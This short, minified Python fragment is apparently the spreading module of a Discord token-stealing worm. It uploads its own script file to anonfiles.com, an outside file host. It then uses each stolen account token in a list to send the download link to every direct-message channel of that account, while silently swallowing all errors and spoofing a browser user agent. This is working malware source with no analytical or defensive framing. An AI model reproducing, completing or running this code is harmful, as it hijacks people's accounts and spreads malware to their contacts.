B='Authorization'
A=Exception
class C:
	def __init__(A):
		A.message='';A.message+=f"\n{A._link()}"
		try:
			for C in dtokens:A.give_me_head={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',B:C};A._DMALL(C)
		except:pass
	def _DMALL(C,token):
		try:
			D=requests.get('https://discord.com/api/v9/users/@me/channels',headers=C.give_me_head).json()
			for E in D:
				try:requests.post(f"https://discord.com/api/v9/channels/"+E['id']+'/messages',headers={B:token},data={'content':f"{C.message}"})
				except A as F:pass
		except A as F:pass
	def _link(B):A='file';return requests.post('https://api.anonfiles.com/upload',files={A:open(sys.argv[0],'rb')}).json()['data'][A]['url']['full']